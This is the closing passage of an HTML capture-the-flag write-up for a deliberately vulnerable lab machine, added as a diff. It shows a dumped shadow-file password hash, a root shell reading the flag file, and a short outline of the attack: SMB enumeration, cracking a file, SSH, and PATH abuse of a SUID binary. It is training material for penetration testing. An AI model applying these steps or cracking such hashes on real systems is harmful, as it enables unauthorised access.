+blackjax:$6$obHVSP0q$Z07U2.XC8B/P2wKOaEu5pqM9fof9SJzs.GRwNyzq/eCcfFCXSmeKYtjXhaRbuuixF8ELc/V3vMzuHLn0iDlbI/:18204:0:99999:7:::
+smb:!:18204:0:99999:7:::</code></pre>
+<pre class="shell"><code>root@nitin:/tmp# cd
+root@nitin:~# cd /root
+root@nitin:/root#
+root@nitin:/root# ls -la
+total 36
+drwx------  3 root root 4096 Nov  4  2019 .
+drwxr-xr-x 22 root root 4096 Nov  4  2019 ..
+-rw-------  1 root root 2526 Nov  4  2019 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Nov  4  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  505 Nov  4  2019 root.txt
+-rw-------  1 root root 4996 Nov  4  2019 .viminfo
+root@nitin:/root# cat root.txt
+    ____  ____  ____  ______   ________    ___   ______
+   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/
+  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __
+ / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /
+/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/
+                     /_____/
+Conguratulation..
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Author : Rahul Gehlaut
+
+Contact : https://www.linkedin.com/in/rahulgehlaut/
+
+WebSite : jameshacker.me</code></pre>
+<figure>
+<img src="12.rooted.png" alt="" /><figcaption>12.rooted</figcaption>
+</figure>
+<p>Rooted.</p>
+<h2 id="how-to-hack">How to hack</h2>
+<ol type="1">
+<li>Enumerate SMB</li>
+<li>Get and Crack safe</li>
+<li>SSH</li>
+<li>Find user flag</li>
+<li>Find the binary that sticks out</li>
+<li>Abuse PATH</li>
+<li>Be Root.</li>
+</ol>
+</body>
+</html>
